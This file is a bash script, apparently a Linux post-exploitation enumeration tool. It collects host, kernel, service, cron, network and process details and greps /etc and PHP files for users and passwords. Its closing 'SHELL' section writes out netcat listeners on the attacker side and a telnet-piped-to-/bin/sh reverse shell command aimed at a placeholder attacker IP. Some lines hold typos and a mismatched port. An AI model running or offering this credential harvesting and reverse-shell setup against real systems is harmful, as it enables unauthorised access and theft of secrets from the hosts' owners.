#!/bin/bash -
#===============================================================================
#
#          FILE: linux.sh
#
#         USAGE: ./linux.sh
#
#   DESCRIPTION: Script to collect various details from any linux host.
#
#       OPTIONS: ---
#  REQUIREMENTS: ---
#          BUGS: ---
#         NOTES: ---
#        AUTHOR: Amit Agarwal (raj77in/raj77_in)
#       CREATED: 10/27/2017 15:47
# Last modified: Fri Oct 27, 2017  03:48PM
#      REVISION:  ---
#===============================================================================


function header ()
{
	
	echo;echo;echo
	echo ===================================
	echo "*************** $1 ***************"
	echo ===================================
	echo;
}

function pr ()
{
	printf "%s\n=>\t%s\n" "$1" "$2"
}


exec 2>/tmp/error.log

header "Scan Details"
pr "Date" "$(date)"
pr "Hostname" "$(hostname)"
pr "uname" "$(uname -a)"

header "Distro/Version"
pr "Issue" "$(cat /etc/issue)"
pr "Rel" "$(cat /etc/*-release)"
pr "LSB-Rel" "$(cat /etc/lsb-release)"
pr "RHEL-Rel" "$(cat /etc/redhat-release)"


header "Kernel information"
pr "proc-version" "$(cat /proc/version)"
pr "uname -a" "$(uname -a)"
pr "uname mrs" "$(uname -mrs)"
pr "kernel rpm" "$(rpm -q kernel)"
pr "dmesg-linux" "$(dmesg | grep Linux)"
pr "vmlinuz" "$(ls /boot | grep vmlinuz-)"


header "ENV Vars"
pr "etc-profile" "$(cat /etc/profile)"
pr "etc-bashrc" "$(cat /etc/bashrc)"
pr "bash-profile" "$(cat ~/.bash_profile)"
pr "bashrc" "$(cat ~/.bashrc)"
pr "bash-logout" "$(cat ~/.bash_logout)"
# pr "env" "$(env)"
# pr "set" "$(set)"


header "Printer?"
pr "lpstat" "$(lpstat -a)"

header "Services"
pr "ps-aux" "$(ps aux)"
pr "ps-ef" "$(ps -ef)"
pr "top" "$(top -n 1)"
pr "etc-services" "$(cat /etc/services)"

header "Processes"
pr "root-aux" "$(ps aux | grep root)"
pr "root-ef" "$(ps -ef | grep root)"

header "Applications"
pr "usr-bin" "$(ls -alh /usr/bin/)"
pr "sbin" "$(ls -alh /sbin/)"
pr "dpkg" "$(dpkg -l)"
pr "rpm" "$(rpm -qa)"
pr "apt-arch" "$(ls -alh /var/cache/apt/archivesO)"
pr "yum-cache" "$(ls -alh /var/cache/yum/)"

header "Misconfigured Services"
pr "syslog" "$(cat /etc/syslog.conf)"
pr "chhtp" "$(cat /etc/chttp.conf)"
pr "lighthttpd" "$(cat /etc/lighttpd.conf)"
pr "cupsd" "$(cat /etc/cups/cupsd.conf)"
pr "inetd" "$(cat /etc/inetd.conf)"
pr "apache2" "$(cat /etc/apache2/apache2.conf)"
pr "my.conf" "$(cat /etc/my.conf)"
pr "httpd.conf" "$(cat /etc/httpd/conf/httpd.conf)"
pr "XAMPP-httpd.conf" "$(cat /opt/lampp/etc/httpd.conf)"
pr "etc" "$(ls -aRl /etc/ | awk '$1 ~ /^.*r.*/')"


header "JOBS"
pr "crontab" "$(crontab -l)"
pr "spool-cron" "$(ls -alh /var/spool/cron)"
pr "etc-cron-grep" "$(ls -al /etc/ | grep cron)"
pr "etc-cron" "$(ls -al /etc/cron*)"
pr "etc-cron" "$(cat /etc/cron*)"
pr "at.allow" "$(cat /etc/at.allow)"
pr "at.deny" "$(cat /etc/at.deny)"
pr "cron.allow" "$(cat /etc/cron.allow)"
pr "cron.deny" "$(cat /etc/cron.deny)"
pr "crontab" "$(cat /etc/crontab)"
pr "anacrontab" "$(cat /etc/anacrontab)"
pr "ctontabs-root" "$(cat /var/spool/cron/crontabs/root)"

header "UN/PW"
pr "grep-user" "$(grep -r -i user /etc/*)"
pr "grep-pass" "$(grep -r -i pass /etc/*)"
pr "grep-password" "$(grep -r -C 5 "password" /etc/*)"
pr "php-password" "$(find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password")"

header "NICs"
pr "ifconfig-a" "$(/sbin/ifconfig -a)"
pr "interfaces" "$(cat /etc/network/interfaces)"
pr "networks" "$(cat /etc/sysconfig/network)"

header "NW Settings"
pr "resolv" "$(cat /etc/resolv.conf)"
pr "sysconfig-netw" "$(cat /etc/sysconfig/network)"
pr "etc-neworks" "$(cat /etc/networks)"
pr "iptables" "$(iptables -L)"
pr "hostname" "$(hostname)"
pr "DNS-donain" "$(dnsdomainname)"

header "USERs/HOSTs Connected?"
pr "lsof-i" "$(lsof -i)"
pr "lsof-i-80" "$(lsof -i :80)"
pr "services-80" "$(grep 80 /etc/services)"
pr "netstat" "$(netstat -antup)"
pr "netstat" "$(netstat -antpx)"
pr "netstat" "$(netstat -tulpn)"
pr "netstat" "chkconfig all$(chkconfig --list)"
pr "chkconfg-3on" "$(chkconfig --list | grep 3:on)"
pr "last logins" "$(last)"
pr "Logins" "$(w)"

header "Caches"
pr "arp" "$(arp -e)"
pr "route" "$(route)"
pr "route-again" "$(/sbin/route -nee)"

header "Sniffing?"
pr "Sniffing" "$(tcpdump -c 10)"

header "SHELL"
pr "$(nc -lvp 4444    # Attacker. Input (Commands))"
pr "$(nc -lvp 4445    # Attacker. Ouput (Results))"
pr "telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!"
